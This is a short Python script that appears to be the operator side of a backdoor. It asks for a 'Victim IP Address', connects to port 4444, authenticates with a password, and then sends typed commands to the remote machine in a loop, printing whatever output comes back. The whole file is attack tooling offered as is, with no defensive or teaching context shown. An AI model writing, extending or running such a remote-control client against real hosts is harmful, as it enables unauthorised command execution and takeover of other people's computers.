import socket
import subprocess

HOST_IP = input('Enter Victim IP Address: ')
REMOTE_HOST = HOST_IP
REMOTE_PORT = 4444
PASSWORD = ""
escape = False
client = socket.socket()
print("Starting Connection")
client.connect((REMOTE_HOST, REMOTE_PORT)) 
input_password = input('Enter Password: ')
client.send(input_password.encode())
status = client.recv(1024).decode()
print(status)
if status == "Incorrect Password...Closing Connection":
    client.close()
else:
    escape = True
        
        
        
while escape == True:
    command = input('Enter Command: ')
    command = command.encode()
    client.send(command)
    print('[+] Command sent')
    output = client.recv(1024)
    output = output.decode()
    if output != None or output != "":
        if output == "Disconnecting":
            escape = False
            client.close()
        print(f"Output: {output}")
